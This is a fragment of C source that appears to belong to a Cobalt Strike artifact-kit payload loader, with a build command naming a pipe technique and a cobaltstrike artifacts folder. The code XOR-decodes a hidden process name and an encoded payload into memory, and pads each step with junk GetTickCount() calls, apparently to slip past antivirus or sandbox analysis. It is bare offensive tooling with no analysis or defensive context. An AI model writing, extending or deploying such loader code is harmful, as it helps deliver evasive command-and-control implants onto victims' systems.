// ./build.sh "pipe" MapViewOfFile 296948 0 true false none /mnt/c/Tools/cobaltstrike/artifacts
   /* decode the process name with the key (valid name, \0, junk to fill 64) */
   for (int x = 0; x < sizeof(process); x++)
   {
      char *ptr1;
      ptr1 = (char *)process + x;
      GetTickCount();
      *ptr1 = *ptr1 ^ key[x % 8];
   }

   for (x = 0; x < length; x++)
   {
      char *ptr2;
      ptr2 = (char *)buffer + x;
      GetTickCount();
      *ptr2 = *ptr2 ^ key[x % 8];
   }

   /* decode the payload with the key */
   for (int x = 0; x < length; x++)
   {
      char *ptr3;
      ptr3 = (char *)ptr + x;
      GetTickCount();
      char *ptr4;
      ptr4 = (char *)buffer + x;
      GetTickCount();
      *ptr3 = *ptr4 ^ key[x % 8];
   }
